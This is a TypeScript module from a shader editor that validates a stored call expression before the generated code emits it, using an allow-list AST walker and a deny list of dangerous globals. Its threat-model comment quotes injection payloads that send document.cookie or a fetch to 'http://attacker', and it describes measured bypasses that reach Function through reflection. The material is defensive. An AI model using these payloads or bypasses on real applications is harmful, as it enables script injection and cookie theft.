/**
 * Validation of an `unknown` node's preserved `rawExpression`, and the ONE
 * place `@babel/parser` is reached from the codegen side.
 *
 * WHY THIS IS ITS OWN MODULE. graphToCode is boot-path (useSyncEngine and
 * ShaderPreview both import it statically), and a static `@babel/parser`
 * import there pinned the whole `vendor-babel` chunk — 805 KB raw / 202 KB
 * gzip, ~32% of the boot payload's gzip — into the entry wave, downloaded,
 * parsed and compiled before the editor was usable, although the one call
 * site runs only for graphs that actually contain an `unknown` node. The
 * parser is loaded here on demand instead; codegen stays synchronous by
 * FAILING CLOSED until it arrives (see isSafeUnknownExpression).
 *
 * THE THREAT MODEL. The `unknown`-node round-trip stores the original
 * call-expression substring in `rawExpression`. graphToCode re-emits it
 * verbatim into the generated module, so a hand-edited `.fastshader` file (or
 * anything else that can write the graph payload) could swap that string for
 * something like
 * `foo((()=>{ window.location='http://attacker/'+document.cookie })())` or
 * `foo(fetch('http://attacker'))` and inject arbitrary JS into the executing
 * shader module.
 *
 * codeToGraph's parser only ever stores the slice of a single CallExpression
 * with a bare-identifier callee. We re-parse on emit and require:
 *   1. parses cleanly as a JS expression (not a statement list) — as JS, never
 *      TypeScript: the text RUNS as JS, and the two disagree. With the
 *      `typescript` plugin `float<import("data:…")>(1)` is a call with type
 *      arguments the walker never looked at; JS reads `(float < import(…)) > 1`
 *      and runs the import (measured 2026-10-27: verdict `true`, payload ran)
 *   2. is a CallExpression
 *   3. the callee is a plain Identifier (no `something.eval(...)` /
 *      `(()=>{...})()` / bracket-property access at the top level)
 *   4. EVERY node in the subtree — including the arguments — is a pure
 *      data/TSL expression (isSafeExprNode), so the arguments can't smuggle
 *      `fetch`, an arrow-function IIFE, an assignment, etc. Type arguments are
 *      rejected outright, for codeToGraph's TS-parsed AST (unknownCallRefNames)
 *   5. every NAME in it is on an ALLOW-list, never merely off a deny-list: a
 *      called name is a three/tsl export or a module helper, a member is a
 *      swizzle or a TSL method, and a name READ is one of those or a name the
 *      module itself declares (the emitter says which). A deny-list cannot
 *      enumerate the platform: `Reflect.get(float, 'constructor')` reached
 *      `Function` past one that named every obvious gateway (measured
 *      2026-10-27, payload ran), and so did `'constr' + 'uctor'`, a property
 *      descriptor's `.value` and `float.call.bind`. With no member outside the
 *      TSL vocabulary nothing can be looked up by a string, and with no callee
 *      outside it nothing but shader maths can be called. The TSL exports that
 *      call a JS function, read a string as a property path or take raw source
 *      are left out of the vocabulary (NOT_SHADER_MATH)
 *
 * BOUND REFERENCES. The stored text names variables of the graph it was parsed
 * from, and those names belong to the NAMER, not to the expression: delete or
 * reorder a node and `myHelper(float1, 3)` silently reads whichever node is
 * `float1` now. So codeToGraph records each identifier the call reads that
 * names an existing node as an EDGE into a positional socket (`ref0`…), with the
 * names in `values.refs`, and graphToCode re-emits each bound name as what its
 * edge resolves to today (`float(0)` when unwired). The names come from the
 * adversarial graph payload too, but they only SELECT identifier tokens the
 * walker below found; the replacement text is the emitter's own, and the
 * rewritten expression is validated again before it is emitted.
 *
 * Sandboxing the preview iframe means even a successful injection lands in
 * an opaque-origin frame with no localStorage access, but defense in depth
 * is cheap here: keep the inert fallback (`float(0)`) so the shader still
 * compiles and the editor shows the magenta unknown-node tile, instead of
 * mid-flight surprising the user with attacker JS.
 */

// TYPE-ONLY, so it is erased at build time and pulls no runtime chunk.
import type { Node } from '@babel/types';
import { TSL_EXPORT_NAMES } from './tslExportNames';
import { HELPER_ALIASES, MODULE_HELPER_NAMES } from './moduleHelpers';

/**
 * Identifiers that must never appear anywhere in an `unknown`-node expression,
 * even where the allow-lists below would admit them (a node a file names `top`
 * is a declared name): the gateways to code execution / exfiltration /
 * navigation. Defense in depth BEHIND the allow-lists, which are the control.
 */
const FORBIDDEN_GLOBALS = new Set([
  'eval', 'Function', 'fetch', 'import', 'require', 'globalThis',
  'window', 'document', 'self', 'top', 'parent', 'frames', 'navigator',
  'location', 'localStorage', 'sessionStorage', 'indexedDB', 'postMessage',
  'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
  'setTimeout', 'setInterval', 'queueMicrotask', 'constructor', '__proto__',
  'prototype', 'alert', 'open',
]);

/**
 * three/tsl exports that are not shader maths, left out of the vocabulary: they
 * hand a JS function to TSL to CALL (`Fn`, `If`, `Loop`, `call`, `debug`, the
 * update callbacks, `nodeObject` and kin), read a STRING as a property path on
 * a JS object (`reference` and kin), take raw source (`js`, `code`, `wgsl`, …),
 * are statements (`Return`, `Discard`, `assign`) or rewire TSL itself
 * (`addMethodChaining`). An unknown expression is ONE pure call; none of these
 * has a use there, and each is a way to run or look up something by name.
 */
const NOT_SHADER_MATH = new Set([
  'Fn', 'If', 'Loop', 'Switch', 'Stack', 'stack', 'Return', 'Break', 'Continue', 'Discard', 'Var', 'Const',
  'VarIntent', 'ShaderNode', 'overloadingFn', 'call', 'debug', 'compute', 'computeKernel', 'struct', 'outputStruct',
  'OnBeforeMaterialUpdate', 'OnBeforeObjectUpdate', 'OnMaterialUpdate', 'OnObjectUpdate',
  'addMethodChaining', 'addNodeElement', 'nodeArray', 'nodeImmutable', 'nodeObject', 'nodeObjectIntent',
  'nodeObjects', 'nodeProxy', 'nodeProxyIntent', 'setCurrentStack', 'getCurrentStack', 'append', 'assign',
  'getConstNodeType', 'getShadowRenderObjectFunction',
  'js', 'code', 'glsl', 'glslFn', 'wgsl', 'wgslFn', 'expression',
  'reference', 'referenceBuffer', 'materialReference', 'morphReference', 'rendererReference', 'userData',
]);

/** Methods TSL adds to every node without exporting them as functions (three
 *  r184's `addMethodChaining` table, the conversions and storage ones). */
const CHAIN_ONLY_METHODS = new Set([
  'toVar', 'toConst', 'toVarying', 'toVertexStage', 'toFloat', 'toInt', 'toUint', 'toBool', 'toColor',
  'toVec2', 'toVec3', 'toVec4', 'toIVec2', 'toIVec3', 'toIVec4', 'toUVec2', 'toUVec3', 'toUVec4',
  'toBVec2', 'toBVec3', 'toBVec4', 'toMat2', 'toMat3', 'toMat4', 'toArray', 'toAttribute', 'isolate',
]);

const SWIZZLE_RE = /^(?:[xyzw]{1,4}|[rgba]{1,4}|[stpq]{1,4})$/;

/** A three/tsl export that is shader maths — what the module imports it as. */
const isTslName = (name: string): boolean =>
  TSL_EXPORT_NAMES.has(name) && !NOT_SHADER_MATH.has(name) && !FORBIDDEN_GLOBALS.has(name);

/** What may be CALLED by name: shader maths, or a helper the module defines. */
const isCallableName = (name: string): boolean =>
  isTslName(name) || MODULE_HELPER_NAMES.has(name) || HELPER_ALIASES.has(name);

/** What may follow a `.`: a swizzle or a TSL node method — never a JS one. */
const isMemberName = (name: string): boolean =>
  SWIZZLE_RE.test(name) || isTslName(name) || CHAIN_ONLY_METHODS.has(name);

/** One identifier the expression READS, at its token's offsets in the parsed text. */
export interface UnknownRef {
  readonly name: string;
  readonly start: number;
  readonly end: number;
}

/**
 * Recursively decide whether an expression AST node is a *pure data/TSL
 * expression* — literals, identifiers, swizzles, arithmetic, and calls to
 * (non-forbidden) functions whose arguments are themselves safe. Anything that
 * can execute attacker code — arrow functions / function expressions (IIFEs),
 * assignments, sequence/comma operators, computed (bracket) member access,
 * `new`, template literals, spreads, await/yield, type arguments — falls
 * through to the `default` case (or is refused in its own) and is rejected.
 *
 * Callee names and member names are judged here (isCallableName,
 * isMemberName); a name READ depends on what the module declares, so it is
 * collected and judged by the caller (isSafeUnknownExpression's `declared`).
 *
 * The SAME walk collects every identifier the expression reads into `refs`
 * (when given), so "validated" and "bound" can never drift apart: an operand,
 * an argument, an array element, a member's OBJECT (`a` in `a.mul(2)`). Never
 * a callee name (`max`, `vec3`), a static member's property (`.x`) or anything
 * inside a string — and every other construct is rejected, so that list is the
 * whole of what can be read.
 */
function isSafeExprNode(node: Node | null | undefined, refs?: UnknownRef[]): boolean {
  if (!node) return false;
  switch (node.type) {
    case 'NumericLiteral':
    case 'StringLiteral':
    case 'BooleanLiteral':
    case 'NullLiteral':
    case 'BigIntLiteral':
    case 'DecimalLiteral':
      return true;
    case 'Identifier':
      if (FORBIDDEN_GLOBALS.has(node.name)) return false;
      if (refs && node.start != null && node.end != null) {
        refs.push({ name: node.name, start: node.start, end: node.end });
      }
      return true;
    case 'UnaryExpression':
      // Allow the numeric/logical unaries that show up in real expressions
      // (e.g. `-1.0`, `!flag`); reject `delete`/`typeof`/`void`.
      return (node.operator === '-' || node.operator === '+' || node.operator === '!') &&
        isSafeExprNode(node.argument, refs);
    case 'BinaryExpression':
      return ['+', '-', '*', '/', '%', '**'].includes(node.operator) &&
        node.left.type !== 'PrivateName' &&
        isSafeExprNode(node.left, refs) && isSafeExprNode(node.right, refs);
    case 'ArrayExpression':
      // A `null` element is an array hole; a SpreadElement falls through to
      // isSafeExprNode's default and is rejected.
      return node.elements.every((el) => el == null || isSafeExprNode(el, refs));
    case 'MemberExpression':
      // Only `obj.prop` with a TSL property — never `obj[expr]`, and never a
      // JS one (`.call`, `.value`, `.get`): nothing can be looked up by name.
      return !node.computed &&
        node.property.type === 'Identifier' &&
        !FORBIDDEN_GLOBALS.has(node.property.name) &&
        isMemberName(node.property.name) &&
        isSafeExprNode(node.object, refs);
    case 'CallExpression': {
      // `f<T>(x)`: only a TypeScript parse produces these (codeToGraph's), and
      // the same text is two comparisons in JS — see the threat model above.
      const typed = node as { typeArguments?: unknown; typeParameters?: unknown };
      if (typed.typeArguments != null || typed.typeParameters != null) return false;
      const callee = node.callee;
      if (callee.type === 'Identifier') {
        // A callee NAME is checked, never collected: `max(a, 1)` reads `a`.
        if (FORBIDDEN_GLOBALS.has(callee.name) || !isCallableName(callee.name)) return false;
      } else if (callee.type === 'MemberExpression') {
        // Method-chain callee, e.g. `vec3(...).mul(2)` — validate the chain.
        if (!isSafeExprNode(callee, refs)) return false;
      } else {
        // Super(), import(), an IIFE callee, a tagged template, etc.
        return false;
      }
      return node.arguments.every((a) => isSafeExprNode(a, refs));
    }
    default:
      return false;
  }
}

type ParseExpression = typeof import('@babel/parser').parseExpression;

/** The real parser, once its chunk has landed. `null` means "not yet". */
let parseExpr: ParseExpression | null = null;
/** In-flight load, so N cold expressions in one pass share one fetch. */
let loading: Promise<void> | null = null;

/**
 * Verdict cache: codegen re-runs on every graph change (per keystroke while
 * scrubbing), and each pass re-parsed every unknown node's rawExpression with
 * Babel. The verdict is a pure function of the string, so memoize it —
 * size-capped so pathological churn (many distinct adversarial expressions)
 * can't grow it unboundedly.
 *
 * Only REAL verdicts land here. A fail-closed answer given while the parser is
 * still loading is deliberately NOT cached, or the expression would stay inert
 * for the life of the session.
 *
 * A verdict is the identifier list of a SAFE expression (the rebind reads it)
 * and `null` for an unsafe one.
 */
const unknownExprVerdicts = new Map<string, readonly UnknownRef[] | null>();
const UNKNOWN_EXPR_CACHE_MAX = 500;
/** Expressions above this aren't cached — rawExpression is adversarial input,
 *  and 500 pinned multi-hundred-KB strings would be a memory hold. */
const UNKNOWN_EXPR_CACHE_MAX_LEN = 4096;

const listeners = new Set<() => void>();

/**
 * Load the parser chunk. Idempotent; resolves as soon as the parser is usable.
 *
 * Exported because two callers need to KNOW when validation is possible rather
 * than discover it: the tests (which assert on emitted code synchronously), and
 * anything that would rather pay the fetch up front than emit a frame of
 * fallbacks. A failed load clears `loading` so a later call retries — a chunk
 * that 404s once must not disable the validator for the session.
 */
export function loadUnknownExpressionValidator(): Promise<void> {
  if (parseExpr) return Promise.resolve();
  if (!loading) {
    loading = import('@babel/parser')
      .then((m) => { parseExpr = m.parseExpression; })
      .catch(() => { loading = null; });
  }
  return loading;
}

/**
 * Subscribe to "the validator just became available". Fires ONCE per load, and
 * only when something actually asked for a verdict while the parser was cold —
 * that is the case where an already-emitted module is holding fallbacks and its
 * producer needs to re-run. Returns an unsubscribe.
 */
export function onUnknownExpressionValidated(cb: () => void): () => void {
  listeners.add(cb);
  return () => { listeners.delete(cb); };
}

/**
 * The verdict on `expr`: its identifier references when it is safe, `null`
 * when it is not, `undefined` when the parser has not arrived yet (FAIL CLOSED
 * — every caller treats it as unsafe; the load is kicked off and subscribers
 * are told when it lands so the pass can re-run).
 */
function analyze(expr: string): readonly UnknownRef[] | null | undefined {
  const cached = unknownExprVerdicts.get(expr);
  if (cached !== undefined) return cached;

  if (!parseExpr) {
    void loadUnknownExpressionValidator().then(() => {
      if (!parseExpr) return; // load failed; stay inert, a later call retries
      for (const cb of listeners) cb();
    });
    return undefined;
  }

  let verdict: readonly UnknownRef[] | null = null;
  try {
    // JS, not TypeScript: see the threat model's point 1.
    const ast = parseExpr(expr, { sourceType: 'module' });
    const refs: UnknownRef[] = [];
    if (
      ast.type === 'CallExpression' &&
      ast.callee.type === 'Identifier' &&
      // Deep-validate the whole call (callee name + every argument subtree).
      isSafeExprNode(ast, refs)
    ) verdict = refs;
  } catch {
    verdict = null;
  }
  if (expr.length <= UNKNOWN_EXPR_CACHE_MAX_LEN) {
    // Evict oldest-first (Map preserves insertion order) instead of a
    // wholesale clear, so a hot graph keeps its working set warm.
    if (unknownExprVerdicts.size >= UNKNOWN_EXPR_CACHE_MAX) {
      const oldest = unknownExprVerdicts.keys().next().value;
      if (oldest !== undefined) unknownExprVerdicts.delete(oldest);
    }
    unknownExprVerdicts.set(expr, verdict);
  }
  return verdict;
}

/**
 * Is `expr` safe to emit verbatim?
 *
 * SYNCHRONOUS, because codegen is. When the parser has not arrived yet the
 * answer is `false` — FAIL CLOSED: an expression that has not been checked by
 * the real parser is never emitted. The load is kicked off, and subscribers are
 * told when it lands so the pass can re-run and the expression can come back.
 *
 * `declared` answers which other names the expression may READ: the ones the
 * emitting module declares (graphToCode passes its own). A declared name
 * shadows any global of that spelling, so reading it reads the node; any other
 * name could only be a global, and is refused (graphToCode reads it as 0 first:
 * neutralizeUndeclaredReads). Absent, only TSL names and module helpers may be
 * read.
 */
export function isSafeUnknownExpression(expr: string, declared?: (name: string) => boolean): boolean {
  const refs = analyze(expr);
  return refs != null && refs.every((r) => isCallableName(r.name) || declared?.(r.name) === true);
}

/**
 * `expr` with every identifier token `subst` names replaced by its value — at
 * the parser's own token positions, so a member's property (`.a`), a callee
 * (`a(1)`) and a string (`"a"`) are never touched. `null` when `expr` is unsafe
 * or the parser is cold. The result is NOT yet trusted: the caller validates it
 * again before emitting it (graphToCode does), since a replacement is emitter
 * text that may still land on a forbidden global.
 */
export function rebindUnknownExpression(
  expr: string,
  subst: ReadonlyMap<string, string>,
): string | null {
  const refs = analyze(expr);
  if (!refs) return null;
  let out = expr;
  // Last token first, so every earlier offset still points where it did.
  for (const r of [...refs].sort((a, b) => b.start - a.start)) {
    const s = subst.get(r.name);
    if (s !== undefined) out = out.slice(0, r.start) + s + out.slice(r.end);
  }
  return out;
}

/**
 * `expr` with every name it READS that is neither TSL's, a helper's nor
 * `declared` replaced by `float(0)` — at the parser's own token positions, as
 * `rebindUnknownExpression` does. Such a name could only be a global (what
 * rule 5 refuses) or a dangling one the module never declares, a
 * ReferenceError that killed the whole shader — a one-way node's Apply leaves
 * `normalMap(image3)` reading an `image3` nothing declares. Read as 0, like an
 * unwired reference, the expression keeps the rest of its text and stays a
 * fixed point of the next Apply, where `float(0)` for the whole call became a
 * Float node and relaid the graph out. `null` when `expr` is unsafe in any
 * other way (or the parser is cold): that is still the whole `float(0)`.
 */
export function neutralizeUndeclaredReads(expr: string, declared: (name: string) => boolean): string | null {
  const refs = analyze(expr);
  if (!refs) return null;
  let out = expr;
  for (const r of [...refs].sort((a, b) => b.start - a.start)) {
    if (!isCallableName(r.name) && !declared(r.name)) out = out.slice(0, r.start) + 'float(0)' + out.slice(r.end);
  }
  return out;
}

/** At most this many references are bound per unknown node (sockets `ref0`…). */
export const MAX_UNKNOWN_REFS = 32;

/** The positional socket a bound reference arrives on. Positional, so no user
 *  text reaches a handle id, an edge id or a DOM selector, and a rename keeps
 *  the edge id (and its waypoints) across an Apply. */
export const unknownRefHandle = (i: number): string => `ref${i}`;

/** A JS IdentifierName — what a bound name must be, written or read. */
const REF_NAME_RE = /^[\p{ID_Start}$_][\p{ID_Continue}$‌‍]*$/u;
/** Longest `values.refs` read: 32 names of any sane length; anything longer is a tampered file. */
const REFS_MAX_LEN = 4096;

export const isUnknownRefName = (name: string): boolean => REF_NAME_RE.test(name);

/**
 * The identifiers an `unknown` call reads, deduped in source order — the parse
 * side's half of the ONE walker, run over codeToGraph's own AST (no parser
 * load). `null` when the call is not a shape graphToCode would emit (a member
 * callee, an unsafe argument): nothing is bound then.
 */
export function unknownCallRefNames(call: Node): string[] | null {
  if (call.type !== 'CallExpression' || call.callee.type !== 'Identifier') return null;
  const refs: UnknownRef[] = [];
  if (!isSafeExprNode(call, refs)) return null;
  return [...new Set(refs.map((r) => r.name))];
}

/** One bound reference: the name the stored expression spells, and its socket. */
export interface UnknownRefSlot {
  readonly name: string;
  readonly handle: string;
}

/**
 * The bound references of an `unknown` node's `values` (`refs`: space-separated
 * names, socket `ref<i>` for the i-th). Adversarial: anything but a string is
 * no list, and a name that is not an identifier or repeats an earlier one loses
 * its slot WITHOUT shifting the others — the sockets are positional, so a
 * skipped entry must not hand its neighbour's edge to another name. Absent on
 * every graph saved before references were bound, which is what keeps those
 * byte-identical.
 */
export function unknownRefSlots(values: Readonly<Record<string, unknown>>): UnknownRefSlot[] {
  const raw = values.refs;
  if (typeof raw !== 'string' || raw === '' || raw.length > REFS_MAX_LEN) return [];
  const seen = new Set<string>();
  const slots: UnknownRefSlot[] = [];
  raw.split(' ', MAX_UNKNOWN_REFS).forEach((name, i) => {
    if (!isUnknownRefName(name) || seen.has(name)) return;
    seen.add(name);
    slots.push({ name, handle: unknownRefHandle(i) });
  });
  return slots;
}
